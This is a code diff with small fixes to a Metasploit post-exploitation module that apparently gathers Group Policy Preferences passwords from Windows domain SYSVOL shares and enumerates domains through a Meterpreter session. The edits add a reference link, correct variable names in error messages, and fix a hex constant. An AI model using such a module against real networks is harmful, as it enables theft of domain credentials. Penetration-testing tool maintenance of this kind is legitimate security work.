@@ -41,7 +41,8 @@ class Metasploit3 < Msf::Post
 				[
 					['URL', 'http://esec-pentest.sogeti.com/exploiting-windows-2008-group-policy-preferences'],
 					['URL', 'http://msdn.microsoft.com/en-us/library/cc232604(v=prot.13)'],
-					['URL', 'http://rewtdance.blogspot.com/2012/06/exploiting-windows-2008-group-policy.html']
+					['URL', 'http://rewtdance.blogspot.com/2012/06/exploiting-windows-2008-group-policy.html'],
+					['URL', 'http://blogs.technet.com/grouppolicy/archive/2009/04/22/passwords-in-group-policy-preferences-updated.aspx']
 				],
 			'Platform'      => [ 'windows' ],
 			'SessionTypes'  => [ 'meterpreter' ]
@@ -126,11 +127,11 @@ class Metasploit3 < Msf::Post
 							task_paths << find_path(policy_path, task_path_user)
 						end
 					rescue Rex::Post::Meterpreter::RequestError => e
-						print_error "Received error code #{e.code} when reading #{tpath}"
+						print_error "Received error code #{e.code} when reading #{domain_path}"
 					end
 				end
 			rescue Rex::Post::Meterpreter::RequestError => e
-				print_error "Received error code #{e.code} when reading #{tpath}"
+				print_error "Received error code #{e.code} when reading #{sysvol_path}"
 			end
 		end
 
@@ -184,8 +185,8 @@ class Metasploit3 < Msf::Post
 			return xml_path if client.fs.file.stat(xml_path)
 		rescue Rex::Post::Meterpreter::RequestError => e
 			# No permissions for this specific file.
+			return nil
 		end
-		return nil
 	end
 
 	def get_xml(path)
@@ -359,7 +360,7 @@ class Metasploit3 < Msf::Post
 	#enum_domains.rb
 	def enum_domains
 		print_status "Enumerating Domains on the Network..."
-		domain_enum = 80000000 # SV_TYPE_DOMAIN_ENUM
+		domain_enum = 0x80000000 # SV_TYPE_DOMAIN_ENUM
 		buffersize = 500
 		result = client.railgun.netapi32.NetServerEnum(nil,100,4,buffersize,4,4,domain_enum,nil,nil)
 		# Estimate new buffer size on percentage recovered.
